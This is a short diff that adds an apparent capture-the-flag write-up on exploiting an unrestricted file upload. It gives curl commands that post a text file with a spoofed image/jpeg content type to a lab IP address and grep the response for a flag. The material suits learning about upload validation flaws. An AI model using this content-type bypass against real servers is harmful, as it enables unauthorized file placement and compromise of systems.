@@ -1,0 +1,9 @@
+Upload:
+	Unrectricted File Upload, make easly, for first we need to inspect HTML of current page, after find FORM, need inspect input
+	tags for this form, for example = "<input name=uploaded, type=file>", for this input we know, what he is upload file with key
+	"uploaded", after this we trying upload any files to server, and check validate format (.jpg, .png and etc.) , after this, try make POST request with CURL help
+	EXAMPLE:
+		curl -i -X POST -H "Content-Type: multipart/form-data" -F "Upload=Upload" -F "uploaded=@/Users/sjakku/Desktop/common.txt;type=image/jpeg" http://192.168.99.107/\?page\=upload | grep flag
+	1) curl -i -X POST -H "Content-Type: multipart/form-data" -F "Upload=Upload" -F "uploaded=@/Users/sjakku/Desktop/common.txt;type=image/jpeg" http://192.168.99.107/?page=upload -o after_req.html
+	2) curl -i -X POST -H "Content-Type: multipart/form-data" -F "Upload=Upload" -F "uploaded=@/Users/sjakku/Desktop/common.txt;type=image/jpeg" http://192.168.99.107/?page=upload -o after_successfylly_req.html
+	3) diff after_req.html after_successfully_req.html
